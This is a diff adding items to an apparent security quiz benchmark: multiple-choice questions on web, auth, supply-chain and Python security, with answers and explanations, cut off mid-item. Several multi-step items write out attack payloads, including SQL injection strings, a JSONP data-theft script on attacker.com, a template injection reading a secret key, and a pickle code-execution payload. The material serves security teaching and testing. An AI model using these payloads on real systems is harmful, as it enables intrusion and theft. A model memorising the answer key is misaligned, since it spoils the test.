+      "question": "What does an SBOM (Software Bill of Materials) contain and why is it important for security?",
+      "choices": {
+        "A": "A comprehensive inventory of all software components, versions, and their dependencies, enabling vulnerability tracking and license compliance",
+        "B": "A backup of all source code files in the project",
+        "C": "A list of all API endpoints in an application for penetration testing",
+        "D": "A record of all security incidents that have occurred in the project"
+      },
+      "answer": "A",
+      "explanation": "An SBOM is a machine-readable inventory of every component in a software product including direct and transitive dependencies, versions, suppliers, and licenses. It enables automated vulnerability scanning against CVE databases, supply chain risk assessment, and regulatory compliance (e.g., US Executive Order 14028).",
+      "topic": "sbom_security",
+      "topic_category": "supply_chain",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC046",
+      "question": "What is the security implication of CORS responding with Access-Control-Allow-Origin: * when the endpoint returns sensitive user data?",
+      "choices": {
+        "A": "The wildcard allows any website to both send and receive authenticated requests",
+        "B": "The server will crash from too many cross-origin requests",
+        "C": "Any website can read responses from this endpoint, but cookies are not sent because wildcard origin disallows credentials",
+        "D": "No security impact; the wildcard is fine for public APIs"
+      },
+      "answer": "C",
+      "explanation": "A wildcard (*) origin means any site can read responses, but browsers prohibit sending credentials (cookies, auth headers) with wildcard CORS. If the endpoint relies solely on cookies for auth, data is safe. But if the endpoint returns sensitive data based on IP, API keys in query strings, or other non-credential auth, data is exposed.",
+      "topic": "cors_wildcard_risk",
+      "topic_category": "web_headers",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC047",
+      "question": "What is 'credential stuffing' and how does it differ from brute force?",
+      "choices": {
+        "A": "They are the same attack with different names",
+        "B": "Credential stuffing targets API endpoints; brute force targets login forms",
+        "C": "Credential stuffing uses stolen username/password pairs from data breaches on other sites; brute force tries all possible combinations",
+        "D": "Credential stuffing is automated; brute force is manual"
+      },
+      "answer": "C",
+      "explanation": "Credential stuffing uses credentials leaked from breached sites, exploiting password reuse across services. Brute force systematically tries all possible passwords. Credential stuffing is more efficient because it uses real passwords people have chosen. Defenses include rate limiting, MFA, breached password detection (HaveIBeenPwned API), and CAPTCHAs.",
+      "topic": "credential_stuffing",
+      "topic_category": "auth",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC048",
+      "question": "What is the difference between X-Frame-Options and CSP frame-ancestors?",
+      "choices": {
+        "A": "X-Frame-Options prevents clickjacking; frame-ancestors prevents XSS",
+        "B": "They do the same thing; X-Frame-Options is the modern replacement for frame-ancestors",
+        "C": "X-Frame-Options only supports DENY and SAMEORIGIN; CSP frame-ancestors supports multiple origins and is the modern replacement for X-Frame-Options",
+        "D": "X-Frame-Options is a request header; frame-ancestors is a response header"
+      },
+      "answer": "C",
+      "explanation": "X-Frame-Options supports only DENY, SAMEORIGIN, and ALLOW-FROM (deprecated, inconsistent browser support). CSP frame-ancestors supports multiple origins (frame-ancestors 'self' https://trusted.com) and is the modern standard. Both prevent clickjacking. If both are present, frame-ancestors takes precedence in modern browsers.",
+      "topic": "xframe_vs_frame_ancestors",
+      "topic_category": "web_headers",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC049",
+      "question": "What is the security risk of using Python's tempfile.mktemp() instead of tempfile.mkstemp()?",
+      "choices": {
+        "A": "mktemp() does not support binary mode",
+        "B": "mktemp() generates predictable filenames",
+        "C": "mktemp() creates files that are world-readable",
+        "D": "mktemp() returns a filename without creating the file, creating a TOCTOU race condition where an attacker can create a symlink at that path before the application does"
+      },
+      "answer": "D",
+      "explanation": "tempfile.mktemp() only generates a name without creating the file, creating a time-of-check to time-of-use (TOCTOU) race condition. An attacker could create a symlink at the predicted path between mktemp() and the application opening the file, redirecting writes to arbitrary locations. mkstemp() atomically creates and opens the file.",
+      "topic": "tempfile_race_condition",
+      "topic_category": "python_security",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC050",
+      "question": "What is the principle of least privilege and how does it apply to API key scoping?",
+      "choices": {
+        "A": "Users should share accounts to reduce the number of privileged accounts; API keys should be shared across services",
+        "B": "Users should have the minimum permissions needed; API keys should be scoped to only the specific operations and resources required",
+        "C": "Users should use the simplest possible password; API keys should be as short as possible",
+        "D": "Users should log in as infrequently as possible; API keys should have no expiration"
+      },
+      "answer": "B",
+      "explanation": "Least privilege means granting only the permissions necessary for a specific task. For API keys, this means scoping to specific endpoints, methods (read-only vs read-write), IP ranges, and resources. A key for reading user profiles should not have permission to delete accounts or access billing data.",
+      "topic": "least_privilege_api_keys",
+      "topic_category": "secrets_management",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC051",
+      "question": "What is mutation XSS (mXSS)?",
+      "choices": {
+        "A": "XSS that exploits browser HTML parser mutations where safe markup is transformed into executable code during DOM serialization and re-parsing",
+        "B": "XSS that mutates its payload to avoid detection on each request",
+        "C": "XSS that modifies the DOM to inject additional payloads over time",
+        "D": "XSS that targets HTML mutation observer APIs"
+      },
+      "answer": "A",
+      "explanation": "Mutation XSS exploits differences in how browsers parse, serialize, and re-parse HTML. A sanitizer may consider markup safe, but when the browser serializes it (e.g., innerHTML read then write) and re-parses, the DOM tree mutates into a structure containing executable JavaScript. This has bypassed DOMPurify and other sanitizers historically.",
+      "topic": "mutation_xss",
+      "topic_category": "injection",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC052",
+      "question": "What is the OAuth 2.0 'client credentials' grant and when should it be used?",
+      "choices": {
+        "A": "For browser-based single page applications authenticating users",
+        "B": "For mobile apps that need offline access to user data",
+        "C": "For machine-to-machine communication where no user is involved, using client_id and client_secret to obtain an access token",
+        "D": "For applications that need to impersonate specific users"
+      },
+      "answer": "C",
+      "explanation": "Client credentials grant is for service-to-service (M2M) communication where the client is acting on its own behalf, not on behalf of a user. The client authenticates with its client_id and client_secret to get an access token. It should not be used for user-facing flows because there is no user authentication step.",
+      "topic": "oauth_client_credentials",
+      "topic_category": "auth",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC053",
+      "question": "What is LDAP injection and how is it typically prevented?",
+      "choices": {
+        "A": "Injecting SQL into LDAP queries; prevented by parameterized SQL",
+        "B": "Injecting LDAP filter metacharacters (e.g., *, |, &) to modify query logic; prevented by escaping special characters and input validation",
+        "C": "Overloading the LDAP server with too many queries; prevented by rate limiting",
+        "D": "Injecting JavaScript into LDAP directory entries; prevented by CSP headers"
+      },
+      "answer": "B",
+      "explanation": "LDAP injection inserts metacharacters like )(|(password=*) into search filters to alter query logic, potentially bypassing authentication or extracting directory data. Prevention requires escaping LDAP special characters (*, (, ), \\, NUL) using functions like ldap3.utils.dn.escape_rdn or manual escaping per RFC 4515.",
+      "topic": "ldap_injection",
+      "topic_category": "injection",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC054",
+      "question": "What is the security risk of the following credential rotation strategy: rotating API keys once per year?",
+      "choices": {
+        "A": "The rotation window is too long: a compromised key has up to a year of useful lifetime, and infrequent rotation means the process is often manual, error-prone, and untested",
+        "B": "No risk; annual rotation is industry standard",
+        "C": "API keys should never be rotated because it breaks client integrations",
+        "D": "Annual rotation causes too many service disruptions"
+      },
+      "answer": "A",
+      "explanation": "Long rotation windows mean compromised keys remain valid for extended periods. Additionally, infrequent rotation means the rotation process itself is rarely exercised, increasing the chance of errors or outages during emergency rotation. Best practice is automated rotation on shorter intervals (30-90 days) with zero-downtime dual-key overlap periods.",
+      "topic": "credential_rotation_frequency",
+      "topic_category": "secrets_management",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC055",
+      "question": "What is the OWASP A06:2021 - Vulnerable and Outdated Components category and what CWE does it map to?",
+      "choices": {
+        "A": "Using components without HTTPS; maps to CWE-319",
+        "B": "Using components with known vulnerabilities; maps to CWE-1104 (Use of Unmaintained Third-Party Components)",
+        "C": "Using deprecated JavaScript APIs; maps to CWE-477",
+        "D": "Running outdated operating systems; maps to CWE-693"
+      },
+      "answer": "B",
+      "explanation": "A06:2021 covers using components (libraries, frameworks, OS) with known vulnerabilities, without support, or outdated. It maps primarily to CWE-1104. The category emphasizes the need for dependency scanning, SBOMs, and monitoring CVE databases for all components in the software supply chain.",
+      "topic": "owasp_a06_components",
+      "topic_category": "owasp_top10",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC056",
+      "question": "What is header injection and how can it lead to HTTP response splitting?",
+      "choices": {
+        "A": "Adding too many headers to slow down the server",
+        "B": "Injecting extra HTTP headers by including CRLF (\\r\\n) characters in header values, which can create fake responses or inject content",
+        "C": "Injecting headers to bypass firewall rules",
+        "D": "Modifying the Host header to redirect DNS"
+      },
+      "answer": "B",
+      "explanation": "If user input is placed directly into HTTP response headers without sanitizing CRLF characters (\\r\\n), an attacker can terminate the headers and inject a fake response body (response splitting) or add arbitrary headers (e.g., Set-Cookie for session fixation). Prevention requires stripping or rejecting \\r and \\n in header values.",
+      "topic": "header_injection_crlf",
+      "topic_category": "injection",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC057",
+      "question": "What is the Cross-Origin-Embedder-Policy (COEP) header and why was it introduced?",
+      "choices": {
+        "A": "To prevent other sites from embedding your content in iframes",
+        "B": "To enforce Content-Type validation on embedded resources",
+        "C": "To replace CORS entirely with a simpler mechanism",
+        "D": "To prevent embedding of resources from other origins unless they explicitly opt in, enabling secure features like SharedArrayBuffer that would otherwise allow Spectre-class attacks"
+      },
+      "answer": "D",
+      "explanation": "COEP: require-corp ensures all cross-origin resources loaded by the page have explicitly opted in via CORP headers. Combined with COOP, this creates a 'cross-origin isolated' context where browsers re-enable high-resolution timers and SharedArrayBuffer (disabled post-Spectre). Without COEP, these APIs remain disabled to prevent timing-based side-channel attacks.",
+      "topic": "coep_header",
+      "topic_category": "web_headers",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC058",
+      "question": "What is the difference between service account keys and workload identity federation for cloud authentication?",
+      "choices": {
+        "A": "Workload identity federation requires VPN access while service account keys do not",
+        "B": "Service account keys are more secure because they use asymmetric encryption",
+        "C": "Workload identity federation eliminates long-lived credentials by exchanging short-lived tokens from a trusted identity provider, avoiding the risks of key storage and rotation",
+        "D": "They are the same mechanism with different names across cloud providers"
+      },
+      "answer": "C",
+      "explanation": "Service account keys are long-lived credentials that must be securely stored, distributed, and rotated -- each a potential security gap. Workload identity federation (GCP) / IRSA (AWS) / managed identity (Azure) eliminates persistent credentials by having workloads present platform-attested identity tokens to the cloud IAM, receiving short-lived access tokens in return.",
+      "topic": "workload_identity_federation",
+      "topic_category": "secrets_management",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC059",
+      "question": "What is an attack tree in threat modeling?",
+      "choices": {
+        "A": "A filesystem hierarchy showing where malware is installed",
+        "B": "A binary search tree used in intrusion detection systems",
+        "C": "A hierarchical diagram representing different paths an attacker could take to achieve a goal, with the root node being the attack objective and child nodes being sub-goals or conditions",
+        "D": "A decision tree for incident response procedures"
+      },
+      "answer": "C",
+      "explanation": "Attack trees decompose a high-level attack goal into increasingly specific sub-goals connected by AND/OR nodes. OR nodes mean any child achieves the parent goal; AND nodes require all children. They help identify all possible attack paths, prioritize defenses, and communicate threats to stakeholders. Introduced by Bruce Schneier in 1999.",
+      "topic": "attack_trees",
+      "topic_category": "threat_modeling",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC060",
+      "question": "In Python, what is the security difference between os.path.join('/uploads', user_input) when user_input is an absolute path like '/etc/passwd'?",
+      "choices": {
+        "A": "os.path.join properly sandboxes the path within '/uploads'",
+        "B": "os.path.join raises an exception for absolute paths in later arguments",
+        "C": "os.path.join URL-encodes the path to prevent traversal",
+        "D": "os.path.join ignores all preceding components when a later argument is an absolute path, returning '/etc/passwd' directly"
+      },
+      "answer": "D",
+      "explanation": "os.path.join('/uploads', '/etc/passwd') returns '/etc/passwd' because join discards all previous components when it encounters an absolute path argument. This is a common Python security pitfall. Developers must check that user input is not an absolute path AND verify the resolved path (os.path.realpath) starts with the intended base directory.",
+      "topic": "os_path_join_absolute",
+      "topic_category": "python_security",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC061",
+      "question": "What is log injection and why is it a security concern?",
+      "choices": {
+        "A": "Injecting malicious log files into a server",
+        "B": "Injecting crafted input containing newlines or log format strings to forge log entries, potentially hiding attacks or triggering downstream log processing vulnerabilities",
+        "C": "Reading log files without authorization",
+        "D": "Filling up disk space with excessive logging"
+      },
+      "answer": "B",
+      "explanation": "Log injection occurs when user-controlled input is written to logs without sanitization. An attacker can inject newlines to create fake log entries (e.g., fake admin login successes) or inject format strings that exploit log aggregation tools (e.g., JNDI lookups in Log4j). Prevention: sanitize newlines and control characters before logging.",
+      "topic": "log_injection",
+      "topic_category": "injection",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC062",
+      "question": "What is broken function-level access control (OWASP A01:2021)?",
+      "choices": {
+        "A": "Functions that have too many parameters",
+        "B": "Functions that crash when called by unauthorized users",
+        "C": "API endpoints or functions that do not verify the user's role or permissions before performing privileged operations, often discoverable by changing HTTP methods or URL paths",
+        "D": "Access control that only works on the frontend"
+      },
+      "answer": "C",
+      "explanation": "Broken function-level access control occurs when admin or privileged endpoints lack server-side authorization checks. An attacker might access /api/admin/deleteUser by changing the URL path or HTTP method (e.g., changing GET to DELETE). Frontend-only checks are trivially bypassed. Every endpoint must enforce authorization server-side.",
+      "topic": "broken_function_level_access",
+      "topic_category": "owasp_top10",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC063",
+      "question": "What is the Permissions-Policy (formerly Feature-Policy) header used for?",
+      "choices": {
+        "A": "Controlling which browser features (camera, microphone, geolocation, payment, USB) can be used by the page and its iframes",
+        "B": "Setting file system permissions on the web server",
+        "C": "Restricting which HTTP methods are allowed",
+        "D": "Defining user roles and permissions for the application"
+      },
+      "answer": "A",
+      "explanation": "Permissions-Policy allows a site to control which powerful browser features (camera, microphone, geolocation, fullscreen, payment, USB, etc.) can be used by the page itself and embedded iframes. Setting camera=() disables camera access entirely, preventing malicious iframes from activating it.",
+      "topic": "permissions_policy",
+      "topic_category": "web_headers",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC064",
+      "question": "What is the OWASP A09:2021 - Security Logging and Monitoring Failures category about?",
+      "choices": {
+        "A": "Log files that are not encrypted",
+        "B": "Applications that produce too many log messages",
+        "C": "Insufficient logging, monitoring, and alerting that allows attacks to go undetected, increasing dwell time and damage",
+        "D": "Using third-party monitoring services instead of self-hosted ones"
+      },
+      "answer": "C",
+      "explanation": "A09:2021 covers the failure to detect, escalate, and respond to active breaches. This includes not logging security-relevant events (login failures, access control failures), not monitoring logs for suspicious patterns, and not having incident response procedures. Average breach dwell time is 287 days when detection capabilities are lacking.",
+      "topic": "owasp_a09_logging",
+      "topic_category": "owasp_top10",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC065",
+      "question": "What is a trust boundary in a data flow diagram (DFD) for threat modeling?",
+      "choices": {
+        "A": "A line in the diagram where data crosses between different trust levels (e.g., from user to server, from application to database), indicating where validation and security controls are needed",
+        "B": "A boundary between development and production environments",
+        "C": "A firewall rule that blocks untrusted traffic",
+        "D": "The perimeter of the company's internal network"
+      },
+      "answer": "A",
+      "explanation": "Trust boundaries in DFDs mark where data moves between components with different trust levels. Every trust boundary crossing requires security controls: input validation, authentication, authorization, encryption. Common trust boundaries: user-to-server, server-to-database, internal-to-external API, process-to-process.",
+      "topic": "trust_boundaries_dfd",
+      "topic_category": "threat_modeling",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC066",
+      "question": "What is the danger of Python's __import__() function when called with user-controlled arguments?",
+      "choices": {
+        "A": "It is deprecated and will raise an exception",
+        "B": "It can only import standard library modules, so there is no risk",
+        "C": "It allows dynamic module loading which can be used to import os, subprocess, or other modules to execute arbitrary system commands",
+        "D": "It causes import conflicts with existing modules"
+      },
+      "answer": "C",
+      "explanation": "__import__() with user-controlled arguments allows importing arbitrary Python modules. An attacker could import os, subprocess, shutil, or any installed package to execute commands, read/write files, or exfiltrate data. Even if eval() is blocked, __import__ provides an alternative code execution path.",
+      "topic": "python_dunder_import",
+      "topic_category": "python_security",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC067",
+      "question": "What is typosquatting in the context of package registries?",
+      "choices": {
+        "A": "Registering domain names similar to popular websites",
+        "B": "Publishing malicious packages with names that are common misspellings of popular packages (e.g., 'reqeusts' instead of 'requests')",
+        "C": "Squatting on package names to sell them later",
+        "D": "Using short package names to confuse users"
+      },
+      "answer": "B",
+      "explanation": "Typosquatting on package registries (PyPI, npm) involves publishing malicious packages with names similar to popular ones, hoping developers will accidentally install them. Examples: 'colourama' (colorama), 'python-nmap' vs 'nmap', 'jeIlyfish' (jellyfish with capital I). These packages often include data exfiltration or backdoor code that runs on install.",
+      "topic": "typosquatting_packages",
+      "topic_category": "supply_chain",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC068",
+      "question": "How does TLS certificate pinning improve security and what are its operational risks?",
+      "choices": {
+        "A": "It pins the TLS version to prevent downgrade attacks; risk is incompatibility",
+        "B": "It restricts which certificates the client accepts for a domain beyond CA validation, preventing MitM with rogue CA-issued certs; operational risk is that certificate rotation requires client updates or the application breaks",
+        "C": "It improves performance by caching certificates; operational risk is cache invalidation",
+        "D": "It stores the server's private key on the client for faster handshakes; risk is key exposure"
+      },
+      "answer": "B",
+      "explanation": "Certificate pinning hardcodes the expected certificate or public key in the client, rejecting any other valid certificate (even if CA-signed). This defends against compromised CAs issuing fraudulent certificates. The major operational risk is that certificate renewal or CA changes brick the application until clients are updated. HPKP (HTTP Public Key Pinning) was deprecated partly for this reason.",
+      "topic": "certificate_pinning",
+      "topic_category": "cryptography",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC069",
+      "question": "What is the purpose of secret scanning in CI/CD pipelines?",
+      "choices": {
+        "A": "Scanning for malware in compiled binaries",
+        "B": "Automatically detecting committed secrets (API keys, passwords, private keys, tokens) in source code and configuration files before they reach production",
+        "C": "Encrypting all configuration files before deployment",
+        "D": "Scanning for SQL injection in database queries"
+      },
+      "answer": "B",
+      "explanation": "Secret scanning tools (GitHub Secret Scanning, GitLeaks, TruffleHog, detect-secrets) analyze commits for patterns matching API keys, passwords, private keys, and tokens. Running in CI/CD catches secrets before they are pushed to shared repositories. Even if caught post-push, the secret must be rotated because git history retains it.",
+      "topic": "ci_secret_scanning",
+      "topic_category": "secrets_management",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC070",
+      "question": "What is the OWASP A10:2021 - Server-Side Request Forgery (SSRF) category and why was it added?",
+      "choices": {
+        "A": "Exploiting server-side rendering engines; added due to React SSR vulnerabilities",
+        "B": "Tricking a server into making requests to unintended internal or external resources; added because modern architectures (cloud, microservices) have increased the attack surface for SSRF, enabling access to cloud metadata APIs and internal services",
+        "C": "Bypassing server-side validation; added due to client-side framework adoption",
+        "D": "Forging server SSL certificates; added due to Let's Encrypt automation bugs"
+      },
+      "answer": "B",
+      "explanation": "SSRF was added to the 2021 Top 10 because cloud environments expose metadata APIs (169.254.169.254) and microservices architectures have more internal services accessible from the server. An attacker who can make the server issue requests can access cloud credentials, internal APIs, and private networks. Defenses include URL allowlists, disabling redirects, and network segmentation.",
+      "topic": "owasp_a10_ssrf",
+      "topic_category": "owasp_top10",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SEC071",
+      "question": "A penetration tester discovers a Flask application with the following endpoint:\n\n@app.route('/api/user/<user_id>')\ndef get_user(user_id):\n    user = db.execute(f\"SELECT * FROM users WHERE id = '{user_id}'\").fetchone()\n    if user:\n        return jsonify(dict(user))\n    return jsonify({'error': 'Not found'}), 404\n\nThe tester confirms SQL injection via UNION-based extraction. The database is PostgreSQL. Stage 1: What payload extracts the PostgreSQL version? Stage 2: What subsequent payload lists all table names? Stage 3: What is the most effective remediation?",
+      "choices": {
+        "A": "Stage 1: ' OR 1=1-- Stage 2: ' UNION SELECT * FROM sys.tables-- Stage 3: Use an ORM",
+        "B": "Stage 1: ' UNION SELECT version()-- Stage 2: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'-- Stage 3: Add input length validation",
+        "C": "Stage 1: ' UNION SELECT version()-- Stage 2: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'-- Stage 3: Replace string formatting with parameterized queries using db.execute('SELECT * FROM users WHERE id = ?', (user_id,))",
+        "D": "Stage 1: ' UNION SELECT @@version-- Stage 2: ' UNION SELECT name FROM sysobjects-- Stage 3: Escape single quotes in input"
+      },
+      "answer": "C",
+      "explanation": "Stage 1: version() is the PostgreSQL function (@@version is SQL Server). Stage 2: information_schema.tables with table_schema='public' lists user tables in PostgreSQL (sys.tables/sysobjects are SQL Server). Stage 3: Parameterized queries with placeholders are the definitive fix. ORMs add a layer but the key fix is parameterization. Input validation and escaping are insufficient.",
+      "topic": "union_sqli_exploitation_chain",
+      "topic_category": "injection",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC072",
+      "question": "An attacker finds a web application that reflects the 'callback' parameter in a JSONP endpoint:\n\nGET /api/data?callback=userFunction\nResponse: userFunction({\"user\":\"admin\",\"email\":\"admin@corp.com\"})\n\nStage 1: How can the attacker steal authenticated user data cross-origin? Stage 2: The developer adds CSP: script-src 'self'. Does this mitigate the JSONP attack? Stage 3: What is the correct fix?",
+      "choices": {
+        "A": "Stage 1: Include a script tag pointing to the JSONP endpoint on attacker's page. Stage 2: Yes, CSP blocks the attack. Stage 3: Add CORS headers.",
+        "B": "Stage 1: Include <script src='https://victim.com/api/data?callback=stealData'> on attacker.com where stealData sends data to attacker. Stage 2: No, CSP on victim.com does not protect against attacker.com loading victim's script tag. Stage 3: Remove JSONP support, use CORS with proper origin validation instead.",
+        "C": "Stage 1: Use XMLHttpRequest from attacker.com. Stage 2: Yes, CSP blocks XMLHttpRequest. Stage 3: Validate the callback parameter.",
+        "D": "Stage 1: Iframe the JSONP endpoint. Stage 2: No, iframes bypass CSP. Stage 3: Add X-Frame-Options."
+      },
+      "answer": "B",
+      "explanation": "Stage 1: The attacker's page includes a script tag loading the JSONP endpoint; the callback executes in the attacker's context with the victim's cookies. Stage 2: CSP on victim.com restricts what victim.com loads, but the attacker's page has its own CSP (or none). Stage 3: JSONP is inherently insecure for authenticated data; replace with CORS + JSON API.",
+      "topic": "jsonp_data_theft_chain",
+      "topic_category": "auth",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC073",
+      "question": "A code review reveals this Python Flask application:\n\n@app.route('/render')\ndef render_page():\n    template_str = request.args.get('template', 'Hello, {{ name }}!')\n    name = request.args.get('name', 'World')\n    return render_template_string(template_str, name=name)\n\nStage 1: What vulnerability class is this? Stage 2: Construct a payload that reads the Flask SECRET_KEY from the application config. Stage 3: What can an attacker do with the SECRET_KEY?",
+      "choices": {
+        "A": "Stage 1: SQL injection. Stage 2: ?template=' UNION SELECT secret_key FROM config--. Stage 3: Decrypt the database.",
+        "B": "Stage 1: XSS. Stage 2: <script>alert(config)</script>. Stage 3: Deface the website.",
+        "C": "Stage 1: Path traversal. Stage 2: ?template=../../../etc/passwd. Stage 3: Read system passwords.",
+        "D": "Stage 1: Server-Side Template Injection (SSTI). Stage 2: ?template={{ config['SECRET_KEY'] }} or {{ config.SECRET_KEY }}. Stage 3: Forge session cookies, as Flask signs sessions with SECRET_KEY using itsdangerous, enabling arbitrary session manipulation and authentication bypass."
+      },
+      "answer": "D",
+      "explanation": "Stage 1: User input is used as the template string itself (not as a variable), enabling SSTI. Stage 2: {{ config['SECRET_KEY'] }} accesses Flask's config object in Jinja2. Stage 3: Flask session cookies are signed (not encrypted) with SECRET_KEY. An attacker who obtains it can forge any session cookie, impersonating any user including admins.",
+      "topic": "ssti_to_session_forgery_chain",
+      "topic_category": "injection",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC074",
+      "question": "An application uses JWTs with RS256 (RSA) for authentication. The public key is served at /.well-known/jwks.json. Stage 1: An attacker captures a valid JWT. Can they modify the payload without detection? Stage 2: The attacker changes the 'alg' header from RS256 to HS256 and signs the modified token using the public key. Under what condition does this attack succeed? Stage 3: How should the server defend against this?",
+      "choices": {
+        "A": "Stage 1: Yes, JWTs are encrypted. Stage 2: Always succeeds. Stage 3: Use longer RSA keys.",
+        "B": "Stage 1: No, RS256 is secure. Stage 2: Succeeds only if the public key is compromised. Stage 3: Rotate keys more frequently.",
+        "C": "Stage 1: No, because JWTs expire. Stage 2: Never succeeds because HS256 and RS256 use different key types. Stage 3: Shorten token expiry.",
+        "D": "Stage 1: No, because RSA signature verification prevents tampering. Stage 2: Succeeds if the server uses the JWT's 'alg' header to select the verification algorithm and uses the public key for both RSA and HMAC verification. Stage 3: The server must enforce the expected algorithm (RS256) and reject tokens with any other 'alg' value."
+      },
+      "answer": "D",
+      "explanation": "Stage 1: RS256 signature prevents payload modification (it would invalidate the signature). Stage 2: Algorithm confusion works when the server naively uses the token's alg header and has a single verification key. It uses the RSA public key as the HMAC secret, which matches because the attacker signed with that same public key. Stage 3: Allowlist the expected algorithm server-side; never trust the token's alg claim.",
+      "topic": "jwt_algorithm_confusion_chain",
+      "topic_category": "auth",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC075",
+      "question": "A Python application deserializes user-uploaded data:\n\nimport pickle, base64\ndata = base64.b64decode(request.form['data'])\nobj = pickle.loads(data)\n\nStage 1: Construct a pickle payload that executes 'id' on the server. Stage 2: The developer restricts pickle by subclassing Unpickler and only allowing 'safe' classes. Is this sufficient? Stage 3: What is the correct approach for deserializing untrusted data?",
+      "choices": {
+        "A": "Stage 1: Inject Python code directly into the base64 string. Stage 2: Yes, class whitelisting is sufficient. Stage 3: Use yaml.load() instead.",
+        "B": "Stage 1: Use __reduce__ to return (os.system, ('id',)) and pickle.dumps it. Stage 2: No, restricted unpicklers have historically been bypassed via __reduce_ex__, __setstate__, and other magic methods, and maintaining a complete blocklist is infeasible. Stage 3: Use a data-only format like JSON, MessagePack, or Protocol Buffers that cannot represent executable code.",
+        "C": "Stage 1: Overflow the pickle buffer. Stage 2: No, but adding size limits fixes it. Stage 3: Use encrypted pickle.",
+        "D": "Stage 1: Use eval() inside the pickle stream. Stage 2: Yes, if you block eval. Stage 3: Use XML serialization."
+      },
+      "answer": "B",
+      "explanation": "Stage 1: pickle.__reduce__ allows specifying a callable and arguments to execute during deserialization. Stage 2: Restricted unpicklers are defense-in-depth but have been repeatedly bypassed; the attack surface is too large to blocklist completely. Stage 3: The only safe approach is using formats that cannot encode executable logic (JSON, msgpack, protobuf).",
+      "topic": "pickle_rce_chain",
+      "topic_category": "python_security",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC076",
+      "question": "An application uses bcrypt for password hashing but has a maximum password length of 72 bytes (bcrypt's internal limit). A developer proposes pre-hashing with SHA-256 to support longer passwords: bcrypt.hashpw(hashlib.sha256(password).hexdigest(), salt). Stage 1: What security benefit does pre-hashing provide? Stage 2: What new vulnerability does this specific implementation introduce? Stage 3: What is the correct pre-hashing implementation?",
+      "choices": {
+        "A": "Stage 1: Allows passwords longer than 72 bytes to contribute to the hash. Stage 2: SHA-256 hexdigest output is 64 hex characters (all in ASCII range 0x30-0x66), drastically reducing the keyspace that bcrypt operates on. Also, if the hex string contains a null byte representation, bcrypt truncates at it. Stage 3: Use SHA-256 in raw binary (digest() not hexdigest()) or Base64-encode the hash before passing to bcrypt, and ensure no null bytes.",
+        "B": "Stage 1: Prevents rainbow table attacks. Stage 2: The salt is applied incorrectly. Stage 3: Generate a separate salt for SHA-256.",
+        "C": "Stage 1: Makes hashing faster. Stage 2: No vulnerability. Stage 3: This implementation is already correct.",
+        "D": "Stage 1: Adds an extra layer of encryption. Stage 2: SHA-256 is too slow. Stage 3: Use MD5 for pre-hashing instead."
+      },
+      "answer": "A",
+      "explanation": "Stage 1: Without pre-hashing, bcrypt silently truncates at 72 bytes, so passwords differing only after byte 72 produce identical hashes. Stage 2: hexdigest() uses only 16 unique characters, and bcrypt treats the hex string as the password, reducing effective entropy. Stage 3: Base64-encode the binary SHA-256 digest to preserve entropy and avoid null byte issues.",
+      "topic": "bcrypt_prehashing_pitfall",
+      "topic_category": "cryptography",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC077",
+      "question": "A microservices architecture exposes an internal API at http://internal-api:8080/admin/metrics. The public-facing API gateway has an endpoint that fetches URLs:\n\n@app.route('/fetch')\ndef fetch_url():\n    url = request.args.get('url')\n    resp = requests.get(url)\n    return resp.text\n\nStage 1: What OWASP category does this vulnerability fall under? Stage 2: The developer adds a check: if not url.startswith('http://internal'). How can the attacker bypass this? Stage 3: What is the comprehensive mitigation strategy?",
+      "choices": {
+        "A": "Stage 1: A01:2021 - Broken Access Control. Stage 2: Use HTTPS instead of HTTP. Stage 3: Add authentication to the fetch endpoint.",
+        "B": "Stage 1: A03:2021 - Injection. Stage 2: URL-encode the bypass. Stage 3: Input validation on the URL parameter.",
+        "C": "Stage 1: A05:2021 - Security Misconfiguration. Stage 2: Use an IP address instead of hostname. Stage 3: Configure the firewall.",
